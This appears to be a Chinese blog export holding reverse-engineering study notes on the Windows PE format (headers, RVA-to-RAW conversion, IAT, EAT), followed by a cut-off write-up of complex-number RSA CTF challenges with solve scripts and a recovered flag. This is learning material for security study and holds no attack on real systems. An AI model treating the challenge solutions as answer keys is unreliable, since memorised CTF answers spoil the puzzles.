<h2 id="13-3-5-NT头-可选头"><a href="#13-3-5-NT头-可选头" class="headerlink" title="13.3.5 NT头: 可选头"></a>13.3.5 NT头: 可选头</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span> &#123;</span></span><br><span class="line">  WORD                 Magic;</span><br><span class="line">  BYTE                 MajorLinkerVersion;</span><br><span class="line">  BYTE                 MinorLinkerVersion;</span><br><span class="line">  DWORD                SizeOfCode;</span><br><span class="line">  DWORD                SizeOfInitializedData;</span><br><span class="line">  DWORD                SizeOfUninitializedData;</span><br><span class="line">  DWORD                AddressOfEntryPoint;</span><br><span class="line">  DWORD                BaseOfCode;</span><br><span class="line">  DWORD                BaseOfData;</span><br><span class="line">  DWORD                ImageBase;</span><br><span class="line">  DWORD                SectionAlignment;</span><br><span class="line">  DWORD                FileAlignment;</span><br><span class="line">  WORD                 MajorOperatingSystemVersion;</span><br><span class="line">  WORD                 MinorOperatingSystemVersion;</span><br><span class="line">  WORD                 MajorImageVersion;</span><br><span class="line">  WORD                 MinorImageVersion;</span><br><span class="line">  WORD                 MajorSubsystemVersion;</span><br><span class="line">  WORD                 MinorSubsystemVersion;</span><br><span class="line">  DWORD                Win32VersionValue;</span><br><span class="line">  DWORD                SizeOfImage;</span><br><span class="line">  DWORD                SizeOfHeaders;</span><br><span class="line">  DWORD                CheckSum;</span><br><span class="line">  WORD                 Subsystem;</span><br><span class="line">  WORD                 DllCharacteristics;</span><br><span class="line">  DWORD                SizeOfStackReserve;</span><br><span class="line">  DWORD                SizeOfStackCommit;</span><br><span class="line">  DWORD                SizeOfHeapReserve;</span><br><span class="line">  DWORD                SizeOfHeapCommit;</span><br><span class="line">  DWORD                LoaderFlags;</span><br><span class="line">  DWORD                NumberOfRvaAndSizes;</span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure>
<p>重点关注以下成员</p>
<ul>
<li>Magic: IMAGE_OPTIONAL_HEADER为32位-10B 64位-20B</li>
<li><strong>AddressOfEntryPoint</strong>: 持有EP的RVA值！！！ 指出程序最先执行代码起始地址！！！</li>
<li>ImageBase: 在PE文件被加载到内存时 指出有限装载的地址<br>EXE DLL被装载到用户内存的0 ~ 7FFFFFFF    SYS被装载到内核内存的80000000 ~ FFFFFFFF<br>一般而言 用开发工具创建EXE后 ImageBase值为00400000 DLL文件的ImageBase值为10000000(也可为其他值)<br>执行PE文件时 PE装载器先创建进程 再将文件载入内存 然后把EIP设置为ImageBase+AddressOfEntryPoint</li>
<li>SectionAlignment FileAlignment: PE文件的body部分被划分为节区<br>FileAlignment指定了节区在磁盘文件中的最小单位<br>SectionAlignment则指定了节区在内存中的最小单位</li>
<li>SizeOfImage: 加载PE文件到内存时 SizeOfImage指定了PE Image在虚存中所占空间大小</li>
<li>SizeOfHeaders: 指出整个PE头的大小<br>第一节区所在位置与SizeOfHeaders距文件开始的offset相同</li>
<li>Subsystem: 区分驱动文件(.sys)和普通的可执行文件(.exe .dll)</li>
<li>NumberOfRvaAndSizes: 指定最后一个成员DataDirectory数组的个数(大小不一定为16)</li>
<li>DataDirectory:<br><img src="https://s2.loli.net/2023/12/03/IVkU3uvCy9dxPJZ.png" alt="img"><br>重点关注0,1,9 EXPORT IMPORT TLS</li>
</ul>
<h2 id="13-3-6-节区头"><a href="#13-3-6-节区头" class="headerlink" title="13.3.6 节区头"></a>13.3.6 节区头</h2><p>PE文件被创建为多个节区结构(更加安全 eg.一定程度上防止缓冲区溢出)</p>
<ul>
<li>code: 执行 可读取</li>
<li>data: 非执行 可读写</li>
<li>resource: 非执行 可读取</li>
</ul>
<p>各个节区的属性被记录在节区头中</p>
<p>IMAGE_SECTION_HEADER</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_SECTION_HEADER</span> &#123;</span></span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];</span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;</span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;</span><br><span class="line">  DWORD SizeOfRawData;</span><br><span class="line">  DWORD PointerToRawData;</span><br><span class="line">  DWORD PointerToRelocations;</span><br><span class="line">  DWORD PointerToLinenumbers;</span><br><span class="line">  WORD  NumberOfRelocations;</span><br><span class="line">  WORD  NumberOfLinenumbers;</span><br><span class="line">  DWORD Characteristics;</span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>
<ul>
<li>VirtualSize: 内存中节区所占大小</li>
<li>VirtualAddress: 内存中节区起始位置(RVA)</li>
<li>SizeOfRawData: 磁盘文件中节区所占大小</li>
<li>PointerToRawData: 磁盘文件中节区起始位置</li>
<li>Characteristics: 节区属性(bit OR)</li>
</ul>
<p>其中VirtualAddress和PointerToRawData不带有任何值 由可选头中的SectionAlignment和FileAlignment确定<br>VirtualSize和SizeOfRawData值一般不同!<br>最后看看Name字段 可以向其中放入任何值(甚至可以NULL填充)</p>
<p><img src="https://s2.loli.net/2023/12/03/VcswHEPriI5SOgB.png" alt="img"></p>
<h1 id="13-4-RVA-to-RAW"><a href="#13-4-RVA-to-RAW" class="headerlink" title="13.4 RVA to RAW"></a>13.4 RVA to RAW</h1><p><img src="https://s2.loli.net/2023/12/03/bVn7942XuTZ18OY.png" alt="img"><br>即磁盘到内存的映射<br>方法:</p>
<ol>
<li>查找RVA所在节区</li>
<li>公式计算偏移(RAW)<br><code>offset = RAW - PointerToRawData = RVA - VitrualAddress </code></li>
</ol>
<p>几个练习:<br><img src="https://s2.loli.net/2023/12/03/VcswHEPriI5SOgB.png" alt="img"></p>
<p>Q1. RVA &#x3D; 5000时 FileOffset &#x3D; ?<br>A1. RVA:第一节区 PTR&#x3D;RawAddress &#x3D; 400 VA &#x3D; 1000 &#x3D;&gt; RAW &#x3D; 4400</p>
<p>Q2. RVA &#x3D; 13314<br>A2. 第三节区 VA &#x3D; B000 PTR &#x3D; 8400 &#x3D;&gt; RAW &#x3D; 10714</p>
<p>Q3. RVA &#x3D; ABA8<br>A3. 第二节区 VA&#x3D;9000 PTR &#x3D; 7C00 &#x3D;&gt; RAW &#x3D; 97A8<br>发现算出来偏移在第三节区 说明”无法定义RVA(ABA8)相对应的RAW值”<br>原因: 第二节区的 VirtualSize比RawSize大!</p>
<h1 id="13-5-IAT"><a href="#13-5-IAT" class="headerlink" title="13.5 IAT"></a>13.5 IAT</h1><p><strong>难点来了</strong><br>IAT: 导入地址表(Import Address Table)<br>IAT保存的内容与Windows操作系统的核心进程 内存 DLL结构等有关<br>简言之 IAT是一种表格 用来记录程序正在使用哪些库中的哪些函数</p>
<h2 id="13-5-1-DLL"><a href="#13-5-1-DLL" class="headerlink" title="13.5.1 DLL"></a>13.5.1 DLL</h2><p>相比早期只有库(library) DLL</p>
<ul>
<li>不需要把库包含在程序中 单独组成DLL文件 需要时调用即可</li>
<li>内存映射技术使加载后的DLL代码 资源 能在多个进程中实现共享</li>
<li>更新库时只需要替换相关DLL文件即可</li>
</ul>
<p>加载DLL的两种方式</p>
<ul>
<li>显示链接: 程序使用DLL时加载 使用完毕后释放内存</li>
<li>隐式链接: 程序一开始就一同加载DLL 程序终止时再释放占用的内存  IAT机制与这种链接方式有关</li>
</ul>
<p>OllyDbg查看notepad.exe</p>
<p><img src="https://s2.loli.net/2023/12/03/3XKFV2lzoc18G7j.png" alt="img"></p>
<p>这里可以看到<br>调用CreateFileW()时并非直接调用而是获取01001104处的地址来实现(所有API调用均如此)<br>地址01001104是.text节区的内存区域(IAT内存区域) 地址的值7645EA70即为加载到exe进程内存中CreateFileW()函数(位于kernel32.dll库)的地址<br>比较书和本地可以发现 01001104地址的值有差异 这也是为什么通过01001104而不是通过它指向的地址的值来调用<br>同时由于DLL的重定位 导致无法对实际地址硬编码 同时PE头中表示地址时使用的是RVA而不是VA</p>
<h2 id="13-5-2-IMAGE-IMPORT-DECRIPTOR"><a href="#13-5-2-IMAGE-IMPORT-DECRIPTOR" class="headerlink" title="13.5.2 IMAGE_IMPORT_DECRIPTOR"></a>13.5.2 IMAGE_IMPORT_DECRIPTOR</h2><p>IMAGE_IMPORT_DECRIPTOR结构体记录着PE文件要导入哪些库文件<br>IMAGE_IMPORT_DECRIPTOR结构体数组也被称为IMPORT Directory Table (导入目录)<br>导入多少个库就意味着有多少个IMAGE_IMPORT_DECRIPTOR结构体</p>
<p><img src="https://s2.loli.net/2023/12/03/au16VZ8spBbtfmH.png" alt="img"></p>
<ul>
<li>OriginalFirstThunk(OFT): INT的地址(RVA)</li>
<li>Name: 库名称字符串的地址(RVA)</li>
<li>FirstThunk(FT): IAT的地址(RVA)</li>
</ul>
<p>提示:</p>
<ul>
<li>PE头中提到的table均指数组</li>
<li>INT和IAT是长整型 以NULL结束</li>
<li>INT中各元素的值为IMAGE_IMPORT_BY_NAME结构体指针</li>
<li>INT与IAT大小应相同</li>
</ul>
<p><img src="https://s2.loli.net/2023/12/03/XWDsoRfdbH8ZJFx.png" alt="img"></p>
<p>这张图中 INT和IAT各元素同时指向相同地址 但很多情况下他们是不一致的 要注意</p>
<p>简单了解下PE装载器把导入函数输入IAT的顺序:</p>
<ol>
<li>读取IID的Name成员 获取库名称字符串(“kernel32.dll”)</li>
<li>装载相应库 -&gt; LoadLibrary(“kernel32.dll”)</li>
<li>读取IID中OFT成员 获取INT地址</li>
<li>逐一读取INT数组中的值 获取相应IMAGE_IMPORT_BY_NAME地址(RVA)</li>
<li>使用IIBN的Hint(ordinal)或Name项 获得相应函数的起始地址</li>
<li>读取IID的FT(IAT)成员 获得IAT地址</li>
<li>将上面获取的函数地址输入相应的IAT数组值</li>
<li>重复4-7 直至INT结束(遇到NULL)</li>
</ol>
<h2 id="13-5-3-使用notepad-exe练习"><a href="#13-5-3-使用notepad-exe练习" class="headerlink" title="13.5.3 使用notepad.exe练习"></a>13.5.3 使用notepad.exe练习</h2><p>首先要明确 IMAGE_IMPORT_DECRIPTOR结构体不在PE头而在PE体中 但查找其位置的信息在PE头中<br>前面提到过 NT头中可选头最后一个成员DataDirectory的 [1]记录的就是IMAGE_IMPORT_DECRIPTOR结构体的起始位置(RVA)<br>值为7604<br>RVA-&gt;RAW: 第一节区 RAW&#x3D;0x7604-0x1000+0x400 &#x3D; 6A04<br>WinHEX中找到 可以看到OFT(INT)的RVA值为7990 -&gt; RAW: 6D90   Name RVA:7AAC -&gt; RAW:6EAC  FT(IAT) RVA:12C4-&gt; RAW:6C4<br>跟踪Name可以看到 comdlg.dll字符串<br>跟踪INT 第一个值为7A7A(RVA) -&gt; RAW:6E7A<br>INT是IMAGE_IMPORT_BY_NAME结构体指针数组 数组第一个元素指向函数的Ordinal值000F 函数的名称为PageSetupDlgW<br>跟踪IAT(RAW:6C4) 找到对应comdlg32.dll库</p>
<p>在OllyDbg中查看<br>该exe的ImageBase是01000000所以PageSetupDlgW函数的IAT地址为010012C4 其值为75B83F20 是API的准确起始地址<br>在OD中转到75B83F20对应的反汇编可以看到正是函数开始的地址</p>
<p>IAT真的很重要！ 这些操作要自己多练才能够熟悉<br>尤其是注意到IAT的第一个元素被硬编码成76324906 但是OD中实际地址应该是75B83F20！！ 所以要利用ImageBase+dll’sIAT(RVA)来找!</p>
<h1 id="13-6-EAT"><a href="#13-6-EAT" class="headerlink" title="13.6 EAT"></a>13.6 EAT</h1><p>继续学习EAT<br>EAT使得不同的应用程序可以调用库文件中提供的函数 对应于DLL&#x2F;SYS (IAT对应于exe)<br>只有通过EAT才能准确求得从相应库中导出函数的起始地址<br>对应 IMAGE_EXPORT_DIRECTORY PE文件中仅有一个IMAGE_EXPORT_DIRECTORY结构体</p>
<p>NT可选头的DataDirectory[0].VitrualAdddress的值即为IED结构体数组的起始地址(RVA)<br>再复习下: DataDirectory有两个DWORD成员 VitrualAddress和Size<br>用CFF和WinHex查看<br>ExportDirectory的RVA偏移为168 值为262C &#x3D;&gt; RAW:1A2C<br>ED的size偏移为16C 值为6CFD</p>
<h2 id="13-6-1-IMAGE-EXPORT-DIRECTORY"><a href="#13-6-1-IMAGE-EXPORT-DIRECTORY" class="headerlink" title="13.6.1 IMAGE_EXPORT_DIRECTORY"></a>13.6.1 IMAGE_EXPORT_DIRECTORY</h2><p>下面介绍IMAGE_EXPORT_DIRECTORY结构体中的重要成员</p>
<ul>
<li>NumberOfFunctions: 实际Export函数的个数</li>
<li>NumberOfNames: Export函数中具有名字的函数个数</li>
<li>AddressOfFunctions: Export函数地址数组</li>
<li>AddressOfNames: 函数名称地址数组</li>
<li>AddressOfNameOrdinals: Ordinal地址数组</li>
</ul>
<p>kernel32.dll:</p>
<p><img src="https://s2.loli.net/2023/12/04/qanN2eP5TIwLRBv.png" alt="img"></p>
<p>从库中获取函数地址的API为GetProcAddress()函数 该API通过引用EAT来获取指定API的地址<br>GetProcAddress()操作原理:</p>
<ol>
<li>利用AddressOfNames成员转到函数名称数组</li>
<li>函数名称数组中存储着字符串的地址 通过strcmp比较字符串 查找指定函数的名称(此时数组索引记为name_index)</li>
<li>利用AddressOfNameOrdinals成员 转到ordinal数组</li>
<li>在ordinal数组中通过name_index查找相应ordinal的值</li>
<li>利用AddressOfFunctions成员转到函数地址数组(EAT)</li>
<li>利用4中求到的ordinal值作为数组索引 在EAT中获得指定函数的起始地址</li>
</ol>
<h2 id="13-6-2-使用kernel32-dll练习"><a href="#13-6-2-使用kernel32-dll练习" class="headerlink" title="13.6.2 使用kernel32.dll练习"></a>13.6.2 使用kernel32.dll练习</h2><p>练习从kernel32.dll文件的EAT中查找AddAtomW函数<br>前面计算过IMAGE_EXPORT_DIRECTORY的RAW偏移为1A2C(CFF好像转到输出目录直接就能看)<br>WinHex中找到<br>AddressOfName: offset:1A4C 值:3538(RVA) -&gt; RAW:2938<br>找打第三个地址: 4BB3(RVA) -&gt; RAW:3FB3<br>找到查看 确实是AddAtomw的字符串!</p>
<p>同样可以查到AddAtomW对应的ordinal&#x3D;2(对应数组第3个元素)<br>最后查找AddAtomW的实际函数地址<br>AddressOfFunctions: RAW:1A48 值 2654(RVA) -&gt; RAW:1A54<br>这是数组起始位置 我们已知ordinal为2 所以找第三个 对应地址1A5C 得到的值:0326D9(RVA)<br>这里的RVA是相对kernel32.dll的ImageBase的<br>在NT可选头查看ImageBase的值: 7C800000 所以 AddAtomW函数的VA值为RVA+IB &#x3D; 7C8326D9<br>在OD中查看验证(然而我用OD打开看不到这段的内存…)<br>用IDA打开一样 找到这个地址<br><img src="https://s2.loli.net/2023/12/04/sgUdRnqeV8HJ9Ic.png" alt="img"></p>
<p>可以看到确实就是AddAtomw函数的地址！！！</p>
<hr>
<p>第一遍看的时候只是过了一遍概念 没有跟着书上一起算RVA-&gt;RAW在winhex中来找对应值 也没有开OD来看<br>实操一遍收获还是挺多的 PE文件格式是重中之重！一定要反复看~！</p>
]]></content>
      <categories>
        <category>ReverseEngineering</category>
      </categories>
  </entry>
  <entry>
    <title>Complex RSA</title>
    <url>/2023/12/03/Complex-RSA/</url>
    <content><![CDATA[<p>复数RSA</p>
<span id="more"></span>
<p>在GeekGame2023遇到了复数RSA的概念 挺有意思的(orz) 记录一下</p>
<h2 id="复数域上的rsa-demo"><a href="#复数域上的rsa-demo" class="headerlink" title="复数域上的rsa demo"></a>复数域上的rsa demo</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,lcm,is_prime</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.setrecursionlimit(<span class="number">2047</span>)</span><br><span class="line"></span><br><span class="line">f = (<span class="number">378122348642214690905411683807377396279362526734068034297186493255873563264253248095197659138069664908850853277799239471404715546747080714581633876343291058815268009173602365587463522797812239900814474973941995698621021680129530453282192603316731832323767320307650941745085796583822798379896337325L</span>, <span class="number">205549984221850341303682190742446959375043769671555741781145106776498798455293849755553794941345135675348633855787880355726112506553703853175271830126908219803257875131387292937296039523359975622001865593227631119497003599166091642640101746534401068507972834895023584843991641629874709898672559632L</span>)</span><br><span class="line">e = <span class="number">59107</span></span><br><span class="line">p = <span class="number">228517792080140341</span></span><br><span class="line">q = <span class="number">1675909164550923263854591345270445396052847869117231939809062226222204253885693425526434134321712288675268468398852452684029376569327518089966506865838909486699078280423099271324646863671350838232140981094611254627738568184261530942469845202934677427234062382272736609418198352717</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cadd</span>(<span class="params">a,b,n</span>):</span><br><span class="line">    <span class="keyword">return</span> (a[<span class="number">0</span>]+b[<span class="number">0</span>]%n,a[<span class="number">1</span>]+b[<span class="number">1</span>]%n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmul</span>(<span class="params">a,b,n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((a[<span class="number">0</span>]*b[<span class="number">0</span>]-a[<span class="number">1</span>]*b[<span class="number">1</span>])%n,(a[<span class="number">0</span>]*b[<span class="number">1</span>]+a[<span class="number">1</span>]*b[<span class="number">0</span>])%n)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cpow</span>(<span class="params">a,k,n</span>):</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span>(k==<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">if</span>(k%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">        a=cmul(a,a,n)</span><br><span class="line">        <span class="keyword">return</span> cpow(a,k/<span class="number">2</span>,n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> cmul(a,cpow(cmul(a,a,n),(k-<span class="number">1</span>)/<span class="number">2</span>,n),n)</span><br><span class="line"></span><br><span class="line">o=lcm((p*p-<span class="number">1</span>),(q*q-<span class="number">1</span>))</span><br><span class="line">fm=cpow(f,invert(e,o),n)</span><br><span class="line"><span class="built_in">print</span>(fm)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>复数中的欧拉函数</p>
<ul>
<li>phi(p) &#x3D; p^2 - 1</li>
<li>phi(q) &#x3D; q^2 - 1</li>
<li>phi(n) &#x3D; phi(p) * phi(q)</li>
</ul>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="2023极客大挑战-EzComplex"><a href="#2023极客大挑战-EzComplex" class="headerlink" title="2023极客大挑战-EzComplex"></a>2023极客大挑战-EzComplex</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage9.3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;FAKE&#123;Do_You_know_Complex_numbers&#125;&#x27;</span></span><br><span class="line">p = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">q = random_prime(<span class="number">1</span> &lt;&lt; <span class="number">384</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">N = <span class="built_in">pow</span>(p, <span class="number">2</span>) + <span class="built_in">pow</span>(q, <span class="number">2</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"><span class="built_in">print</span>(N)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line"><span class="string">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>N &#x3D; p^2 + q^2 &#x3D; (p+qi) * (p-qi)<br>在复数域上分解N 遍历其因子就能得到p,q<br>一些sage用法说明:</p>
<ul>
<li>ZZ(i)[N]: 创建了一个整数高斯环</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">c = <span class="number">122977267154486898127643454001467185956864368276013342450998567212966113302012584153291519651365278888605594000436279106907163024162771486315220072170917153855370362692990814276908399943293854077912175867886513964032241638851526276</span></span><br><span class="line">N = <span class="number">973990451943921675425625260267293227445098713194663380695161260771362036776671793195525239267004528550439258233703798932349677698127549891815995206853756301593324349871567926792912475619794804691721625860861059975526781239293017498</span></span><br><span class="line">zn = ZZ[i](N)</span><br><span class="line"><span class="keyword">for</span> d <span class="keyword">in</span> divisors(zn):</span><br><span class="line">    p, q = <span class="built_in">int</span>(d[<span class="number">0</span>]), <span class="built_in">int</span>(d[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> is_prime(p) <span class="keyword">and</span> is_prime(q) <span class="keyword">and</span> p.bit_length()&gt;<span class="number">300</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;p= <span class="subst">&#123;p&#125;</span>\nq= <span class="subst">&#123;q&#125;</span>&#x27;</span>)</span><br><span class="line">p= <span class="number">8732781022306464325787401448517171026218291389436971731700810979177651389459896422549428444142746055523338740248707</span></span><br><span class="line">q= <span class="number">29962125885196559918101088622575501736433575381042696980660846307183241725227137854663856022170515177120773072848343</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> primefac <span class="keyword">import</span> *</span><br><span class="line">d = modinv(<span class="number">65537</span>,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))))</span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_you_like_r41n?_i_pref3r_R1_ng&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="未知来源"><a href="#未知来源" class="headerlink" title="未知来源"></a>未知来源</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag, totient</span><br><span class="line"><span class="comment"># where totient is a function used to calculate phi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>([self.re, self.im])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">complex_pow</span>(<span class="params">c, exp, n</span>):</span><br><span class="line">    result = Complex(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> exp &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> exp &amp; <span class="number">1</span>:</span><br><span class="line">            result = result * c</span><br><span class="line">            result.re = result.re % n</span><br><span class="line">            result.im = result.im % n</span><br><span class="line">        c = c * c</span><br><span class="line">        c.re = c.re % n</span><br><span class="line">        c.im = c.im % n</span><br><span class="line">        exp &gt;&gt;= <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pad</span>(<span class="params">msg, length</span>):</span><br><span class="line">    pad_length = length - <span class="built_in">len</span>(msg) - <span class="number">1</span></span><br><span class="line">    pad_data = os.urandom(pad_length)</span><br><span class="line">    <span class="keyword">return</span> msg + <span class="string">b&#x27;\x00&#x27;</span> + pad_data</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpad</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">return</span> msg.split(<span class="string">b&quot;\x00&quot;</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">bits = <span class="number">512</span></span><br><span class="line">p = getPrime(bits)</span><br><span class="line">q = getPrime(bits)</span><br><span class="line">n = p * q</span><br><span class="line"></span><br><span class="line">sha_flag = hashlib.sha256(flag).digest()</span><br><span class="line"></span><br><span class="line">m1 = Complex(</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(sha_flag[:<span class="built_in">len</span>(sha_flag)//<span class="number">2</span>], <span class="string">&quot;big&quot;</span>),</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(sha_flag[<span class="built_in">len</span>(sha_flag)//<span class="number">2</span>:], <span class="string">&quot;big&quot;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">m2 = Complex(</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(pad(flag[:<span class="built_in">len</span>(flag)//<span class="number">2</span>], bits//<span class="number">4</span>-<span class="number">1</span>), <span class="string">&quot;big&quot;</span>),</span><br><span class="line">        <span class="built_in">int</span>.from_bytes(pad(flag[<span class="built_in">len</span>(flag)//<span class="number">2</span>:], bits//<span class="number">4</span>-<span class="number">1</span>), <span class="string">&quot;big&quot;</span>),</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">phi = totient(p, q)</span><br><span class="line">e = q * inverse(p, phi)</span><br><span class="line">c1 = complex_pow(m1, e, n)</span><br><span class="line">c2 = complex_pow(m2, e, n)</span><br><span class="line"></span><br><span class="line">c1.show()</span><br><span class="line">c2.show()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[90554536599623574119664951128649936419332926063696768860765928746438458550068553748440108394673303800443215316190882880737918820592384729010491685487061658710808286341751196450604089438847354206384322610922839055308138101241906861635339635907663440043442187064090630207952625897567214431195621589834131462698, 9144096375153318849308858335764188418198064372272913164911615933938183103747900881824918069830188301084043148828961577193063557255905230182831945580084452509300200269659063051152684191139872067872645370760797859584822240361290678189844670289832298393156571913616456958845361092243648857334156534377833472900]</span></span><br><span class="line"><span class="string">[62925714576233017213228404230949787334346543378320798964656732359587152905032848271156799538355748406136742979043729040728123730886381468564779041856310262770766050213464073568850702827835472680885186487027698395099598698463717279017013124488699475168052581476224742146967412904416266652605031934025266540003, 62818668456104375760667670741457826560706388018921820295286033114468271151921637926389738844622672202424650967678199715932465104135980734708459543588178208672956785650944371545080965650112025782049517299538052360417245732776384089052839997333049599655001615752078742624898059780909287845495731050387891926520]</span></span><br><span class="line"><span class="string">n = 94040393367054633265453751757391098049234338193258976478647369399924701067077628840760704857546243644552533845934146003988635403227234096447871132283820920489003286967145732739404245319615714787916756200564828237043658350145929927911058782352154997346295194977765305107634012698472977467843980475009837261877</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里计算p,q的phi是复数域上的计算方式:</p>
<ul>
<li>phi(p) &#x3D; p^2 - 1</li>
<li>phi(q) &#x3D; q^2 - 1</li>
<li>phi(n) &#x3D; phi(p) * phi(q)</li>
</ul>
<p><img src="https://s2.loli.net/2023/12/03/SetLslk9bdAMVp4.png" alt="img"></p>
<p>要时刻记住phi(x) &#x3D; x^2 - 1</p>
<p>然后 c1^n - m &#x3D; k1 * q<br>由于m为128bits 完全可以在modn下copper求出m!(更新了cooper的用法 以前只会用来单独求p,q 其实它找的是模n的一个因子的意义下为0的根 完全可以用来解kp,kq的情况)</p>
<p>这里我们要自己加一个返回实部虚部的函数 不然返回的是一个Complex对象</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Complex</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, re, im</span>):</span><br><span class="line">        self.re = re</span><br><span class="line">        self.im = im</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__mul__</span>(<span class="params">self, c</span>):</span><br><span class="line">        re_ = self.re * c.re - self.im * c.im</span><br><span class="line">        im_ = self.re * c.im + self.im * c.re</span><br><span class="line">        <span class="keyword">return</span> Complex(re_, im_)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>([self.re, self.im])</span><br><span class="line">    <span class="keyword">def</span> <span class="title 